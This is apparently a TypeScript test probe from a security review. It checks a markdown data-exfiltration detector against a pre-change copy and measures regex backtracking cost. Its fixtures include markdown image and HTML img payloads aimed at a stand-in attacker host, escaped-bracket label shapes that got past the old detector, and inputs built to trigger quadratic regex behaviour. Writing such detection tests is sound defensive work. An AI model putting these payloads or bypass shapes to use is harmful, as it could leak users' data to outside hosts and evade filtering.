// T84 — item 3: was `REFERENCE_DEF` already quadratic BEFORE T83, and is the
// pre-change copy I measure it on a faithful one?
//
// The copy lives under mkdtemp (path in $T84_TMP). It is the shipped
// `exfil.ts` with `readReferenceDefinitions` replaced by the literal pattern it
// replaced — `/^[ \t]*\[([^\]]+)\]:\s*(?:<([^<>\n]*)>|(\S+))/gm` — and nothing
// else changed but two import specifiers made absolute. A second copy
// (`exfil-current.ts`) is the shipped file with the same two specifiers changed
// and is the control: it must agree with the real module on every shape.
//
// Read-only, offline, synthetic hosts only.
// Usage: T84_TMP=<dir> bun T84-prechange.ts
import { detectExfil as shipped } from "../../../../src/security/detect/exfil";

const TMP = process.env.T84_TMP as string;
const { detectExfil: pre } = (await import(`${TMP}/exfil-prechange.ts`)) as {
  detectExfil: typeof shipped;
};
const { detectExfil: control } = (await import(`${TMP}/exfil-current.ts`)) as {
  detectExfil: typeof shipped;
};

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

// 1. Fidelity of the copies. The control must equal the shipped module and the
// pre-change copy must reproduce T82#F-001 exactly (0 findings on s01..s05).
const fidelity: Array<Record<string, unknown>> = [];
const fidelityShapes: Record<string, string> = {
  s00Baseline: `![a]\n\n[a]: ${U}\n`,
  s01EscapedClose: `![foo\\]]\n\n[foo\\]]: ${U}\n`,
  s02EscapedCloseShort: `![x\\]]\n\n[x\\]]: ${U}\n`,
  s03EscapedCloseFull: `![alt][foo\\]]\n\n[foo\\]]: ${U}\n`,
  s04EscapedCloseCollapsed: `![foo\\]][]\n\n[foo\\]]: ${U}\n`,
  s05TwoEscapedCloses: `![a\\]b\\]c]\n\n[a\\]b\\]c]: ${U}\n`,
  c1Inline: `![a](${U})\n`,
  c2Html: `<img src="${U}">\n`,
  c3Dup: `![a]\n\n[a]: ${U}\n[a]: https://ok.example.org/x\n`,
  c4Angle: `![a]\n\n[a]: <${U}>\n`,
  c5NextLine: `![a]\n\n[a]:\n  ${U}\n`,
  c6WsLabel: `![a  b]\n\n[a b]: ${U}\n`,
};
for (const [id, text] of Object.entries(fidelityShapes)) {
  fidelity.push({
    id,
    shipped: shipped(text, []).length,
    control: control(text, []).length,
    prechange: pre(text, []).length,
  });
}
const controlDrift = fidelity.filter((r) => r.shipped !== r.control).map((r) => r.id);

// 2. The cost claim. `[^\]]+` crosses newlines, so on a document that opens a
// bracket at every line start and never closes one, each line-start `[` scans to
// end of content and backtracks. Shapes deliberately contain NO `]` — the reason
// ten rounds of adversarial shapes missed this.
function ladder(build: (n: number) => string, ns: number[]) {
  const points: Array<{ n: number; bytes: number; preMs: number; postMs: number }> = [];
  for (const n of ns) {
    const text = build(n);
    let preMs = Infinity;
    let postMs = Infinity;
    for (let trial = 0; trial < 3; trial += 1) {
      let t = performance.now();
      pre(text, []);
      preMs = Math.min(preMs, performance.now() - t);
      t = performance.now();
      shipped(text, []);
      postMs = Math.min(postMs, performance.now() - t);
    }
    points.push({
      n,
      bytes: text.length,
      preMs: Number(preMs.toFixed(1)),
      postMs: Number(postMs.toFixed(1)),
    });
  }
  const a = points[0] as { bytes: number; preMs: number; postMs: number };
  const z = points[points.length - 1] as { bytes: number; preMs: number; postMs: number };
  const exp = (x: number, y: number) => Number((Math.log(y / x) / Math.log(z.bytes / a.bytes)).toFixed(2));
  return { points, preExponent: exp(a.preMs, z.preMs), postExponent: exp(a.postMs, z.postMs) };
}

const shapes: Record<string, (n: number) => string> = {
  lineStartOpensNoClose: (n) => "[aaaaaaaaa\n".repeat(n),
  lineStartOpensIndented: (n) => "  [aaaaaaaaa\n".repeat(n),
  lineStartOpensBackslash: (n) => "[aaaa\\aaaa\n".repeat(n),
  lineStartOpensCarriageReturn: (n) => "[aaaaaaaaa\r".repeat(n),
  // a shape no prior round built either: line-start opens with a single `]` far
  // away at the very end, so `[^\]]+` still crosses every line before it
  lineStartOpensOneCloseAtEnd: (n) => "[aaaaaaaaa\n".repeat(n) + "]",
};
const cost: Record<string, unknown> = {};
for (const [id, build] of Object.entries(shapes)) {
  cost[id] = ladder(build, [4000, 8000, 16000, 32000]);
}

console.log(
  JSON.stringify(
    {
      probe: "T84-prechange",
      tmp: TMP,
      fidelity,
      controlDrift,
      prechangeBypasses: fidelity
        .filter((r) => (r.id as string).startsWith("s0") && r.id !== "s00Baseline" && r.prechange === 0)
        .map((r) => r.id),
      cost,
    },
    null,
    2,
  ),
);
